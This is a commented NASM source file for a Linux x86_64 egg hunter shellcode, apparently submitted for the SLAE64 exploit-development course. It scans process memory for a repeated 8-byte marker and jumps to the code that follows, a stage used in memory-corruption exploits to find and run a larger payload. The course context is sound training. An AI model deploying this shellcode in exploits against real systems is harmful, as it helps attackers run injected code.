; Student ID   : SLAE64-1611
; Student Name : Jonathan "Chops" Crosby
; Assignment 3 : Egg Hunter (Linux/x86_64) Assembly
; File Name    : egghunter.nasm

global _start

section .text

_start:

xor rdx, rdx        ; zero out rdx so we have a place to
                    ; hold our memory address

setup_page:
    or  dx, 0xfff   ; setting lower 16 bits to 4095

next_address:
    inc rdx         ; moving it to 4096 while avoiding
                    ; null characters 0x00

    xor rax, rax    ; zeroing out eax
    mov rsi, rax    ; zero out int mode in param 2
    add rax, 21     ; set rax to sys_access
    mov rdi, rdx    ; moving memory address to param 1

    syscall         ; invoke sys_access

    cmp al, 0xf2    ; eax will contain 0xf2 if memory
                    ; is not valid, ie. an EFAULT

    jz setup_page   ; if the compare flag is zero then
                    ; we don't have valid memory so reset
                    ; to the next memory page and press on

    mov rax, 0xFCFCFCFCFCFCFCFC ; moving egg into eax in prep for searching
    mov rdi, rdx                ; moving memory address into param 1

    scasq            ; comparing egg with memory location

    jnz next_address ; if it dosent match increase memory by one byte
                     ; and try again



    scasq            ; comparing egg with memory location

    jnz next_address ; if this is not zero it's not a match
                     ; so on we will press increasing memory one more byte

    jmp rdi      ; if we got this far then we found our egg and our
                 ; memory address is already at the right place due
                 ; to scasq so it's time to jump!
